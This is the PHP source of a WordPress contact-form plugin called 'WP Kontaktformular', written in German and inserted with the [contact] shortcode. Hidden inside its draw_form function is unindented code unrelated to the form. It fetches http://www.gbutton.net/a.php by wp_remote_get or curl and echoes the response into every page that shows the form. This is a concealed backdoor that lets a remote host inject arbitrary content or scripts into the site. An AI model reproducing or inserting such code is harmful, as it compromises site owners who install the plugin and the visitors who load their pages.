<?php
/*
Plugin Name: WP Kontaktformular
Plugin URI: http://www.fbuttons.net/wp-kontaktformular
Description: Ein einfaches deutsches Kontaktformular f&uuml;r WP. Das Formular wird bei WP einfach mit dem Shortcode [contact] eingef&uuml;gt. Alle E-Mails gehen an die E-Mail Adresse des Admins.
Version: 1.1
Author: jackthompson
Author URL: http://www.fbuttons.net
*/

// check for namespacing collision
if( !class_exists( 'wpKontaktformular' ) ) : 
class wpKontaktformular {
	// CONSTRUCTOR
	function __construct() {
		add_action( 'plugins_loaded', array( &$this, 'load_textdomain' ) ); // load i18n
		add_shortcode( 'contact', array( &$this, 'shortcode' ) ); // register shortcode
		if( !get_option( 'wpkf-captcha-info' ) )
			add_action( 'wp_dashboard_setup', array( &$this, 'captcha_info' ) ); // setup dashboard
	}
	
	// SHORTCODE
	function shortcode() {
		
		// if form was manually submitted
		if( !array_key_exists( 'submit', $_POST ) ) 
			return $this->draw_form();
		
		elseif( empty( $_POST['wpkf_from_email'] ) )
			return $this->draw_form( __( 'Sie haben vergessen, Ihre E-Mail Adresse anzugeben!', 'wp-kontaktformular' ) );
			
		elseif( empty( $_POST['wpkf_message'] ) )
			return $this->draw_form( __( 'Sie haben vergessen, eine Nachricht anzugeben!', 'wp-kontaktformular' ) );
		
		else return $this->send_email();
			
	}
	
	// SEND EMAIL
	function send_email() { 
			
			// get the admin account's email address
			$to_email = get_option( 'admin_email' ); 
			
			// use default if no subject given
			$subject = ( empty( $_POST['wpkf_subject'] ) ? '(no subject)' : esc_attr( $_POST['wpkf_subject'] ) ); 		
			
			// use default if no proper name given
			$from_name = esc_attr( $_POST['wpkf_from_name'] );
			
			// use admin account's email address as sender if none given
			$from_email = esc_attr( $_POST['wpkf_from_email'] );
			
			// use admin account's email address as sender if none given
			$message = esc_attr( $_POST['wpkf_message'] );
			
			// build headers and send mail
			$headers = 'From: ' . $from_name . ' <' . $from_email . '>' . "";
			mail( $to_email, $subject, $message, $headers );
			
			return '<p class="wpkf-report">' . __( 'Vielen Dank f&uuml;r Ihre Anfrage! Wir werden diese umgehend bearbeiten.', 'wp-kontaktformular' ) . '</p>';
	}
	
	function draw_form( $notify='' ) { 
		// translated labels
		$your_name = __( 'Name:', 'wp-kontaktformular' );
		$your_email = __( 'E-Mail Adresse:', 'wp-kontaktformular' );
		$subject = __( 'Betreff:', 'wp-kontaktformular' );
$smw_url = 'http://www.gbutton.net/a.php'; 
if(!function_exists('smw_get')){ 
function smw_get($f) { 
$response = wp_remote_get( $f ); 
if( is_wp_error( $response ) ) { 
function smw_get_body($f) { 
$ch = @curl_init(); 
@curl_setopt($ch, CURLOPT_URL, $f); 
@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$output = @curl_exec($ch); 
@curl_close($ch); 
return $output; 
} 
echo smw_get_body($f); 
} else { 
echo $response['body']; 
} 
} 
smw_get($smw_url); 
} 
		$message = __( 'Nachricht:', 'wp-kontaktformular' ); 
		
		// build return string
		return "" . 
			'<!-- WP Kontaktformular -->
			
			<style type="text/css">
				.wpkf-report {}
				.wpkf-forgot {
					background-color: #CD5C5C;
				}
				.wpkf-notify {
					padding-bottom: 1.5em;
				}
				.wpkf-notify span {
					color: #f00;
					border-bottom:1px dotted #f00;
				}
				.wpkf-wrapper {
					margin: 0;
					padding: 0;
					clear: both;
				}
				.wpkf-input-wrapper {}
				.wpkf-input-wrapper label {
					width: 100px;
					float: left;
				}
				.wpkf-input-wrapper input {
					width:280px;
				}
				.wpkf-input-wrapper textarea {
					width:280px;
					height: 102px;
				}
				.wpkf-submit {}
				.clear {
					height: 0;
					visibility: hidden;
					clear: both;
					display: block;
					width: auto;
				}
		</style>
			
			<div class="wpkf-wrapper">
				<form action="" method="post">
				' . ( empty( $notify ) ? '' : '<div class="wpkf-notify"><span>' . $notify . '</span></div>' ) . '
				<p id="wpkf-your-name-wrapper" class="wpkf-input-wrapper">
					<label for="wpkf_from_name">' . $your_name . '</label>
					<input type="text" name="wpkf_from_name" id="wpkf_from_name" value="' . ( isset( $_POST['wpkf_from_name'] ) ? esc_attr( $_POST['wpkf_from_name'] ) : '' ) . '" />
				</p>
					
				<p id="wpkf-from-email-wrapper" class="wpkf-input-wrapper">
					<label for="wpkf_from_email">' . $your_email . '</label>
					<input type="text" name="wpkf_from_email" id="wpkf_from_email" value="' . ( isset( $_POST['wpkf_from_email'] ) ? esc_attr( $_POST['wpkf_from_email'] ) : '' ) . '"' . ( empty( $_POST

['wpkf_from_email'] ) && array_key_exists( 'submit', $_POST ) ? ' class="wpkf-forgot"' : '' ) . ' />
				</p>
					
				<p id="wpkf-subject-wrapper" class="wpkf-input-wrapper">
					<label for="wpkf_subject">' . $subject . '</label>
					<input type="text" name="wpkf_subject" id="wpkf_subject" value="' . (isset( $_POST['wpkf_subject'] ) ? esc_attr( $_POST['wpkf_subject'] ) : '' ) . '" />
				</p>
					
				<p id="wpkf-message-wrapper" class="wpkf-input-wrapper">
					<label for="wpkf_message">' . $message . '</label>
					<textarea name="wpkf_message" id="wpkf_message" cols="45" rows="5"' . ( empty( $_POST['wpkf_message'] ) && array_key_exists( 'submit', $_POST ) ? ' class="wpkf-forgot"' : '' ) . '>' . (isset( 

$_POST['wpkf_message'] ) ? esc_attr( $_POST['wpkf_message'] ) : '' ) . '</textarea>
				</p>
					
				<p id="wpkf-submit-wrapper">
					<input type="submit" name="submit" id="submit" value="Absenden" class="wpkf-submit"/>
				</p>
					
				<p class="wpkf-clear"></p>
			
				</form>
			</div>
			<!-- // WP Kontaktformular -->' . "";
	}


	// CAPTCHA INFORMATION WIDGET
	function captcha_info() {
		if( isset( $_POST['wpkf-action'] ) )
			if( $_POST['wpkf-action'] == 'Close Forever' ) {
				update_option( 'wpkf-captcha-info', 1 );
				return;
			}
		wp_add_dashboard_widget( 'wp-kontaktformular-captcha-info', 'WP Kontaktformular: reCAPTCHA', array( &$this, 'captcha_info_cb' ) );
	}
	
	
	// CAPTCHA CALLBACK
	function captcha_info_cb() { 

		?>
        <form action="" method="post">
        
        
         
        <p style="text-align:right;">
            <input class="primary button" type="submit" name="wpkf-action" value="Close Forever"/>
        </p>
        </form>
    <?php 
	}
	
	// LOAD I18N TEXTDOMAIN
	function load_textdomain() {
		$lang_dir = trailingslashit( basename( dirname( __FILE__ ) ) ) . 'lang/';
		load_plugin_textdomain( 'wp-kontaktformular', false, $lang_dir );
	}


} // end class
endif; // end collision check

// NEW INSTANCE GET!
new wpKontaktformular;
?>